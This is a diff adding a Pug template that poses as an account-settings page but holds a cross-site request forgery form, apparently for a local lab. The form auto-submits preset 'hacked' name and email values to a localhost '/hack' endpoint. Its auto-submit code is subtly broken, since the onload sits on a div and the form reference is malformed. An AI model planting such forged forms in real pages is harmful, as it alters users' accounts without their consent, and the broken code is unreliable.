@@ -1,0 +1,14 @@
+extends base
+block content 
+    .user-view__content
+        .user-view__form-container
+            h2.heading-secondary.ma-bt-md Your account settings
+                div(onload=`document.form-user-data.submit()`)
+                    form.form.form-user-data(action='http://localhost:3000/hack' method='POST' name='form-user-data')
+                        .form__group
+                            label.form__label(for='name') Name
+                            input#name.form__input.hack(type='text', value='hacked', required, name='name')
+                        .form__group.ma-bt-md
+                            label.form__label(for='email') Email address
+                            input#email.form__input.hack(type='email', value='hacked@gmail.com', required, name ='email')
+            
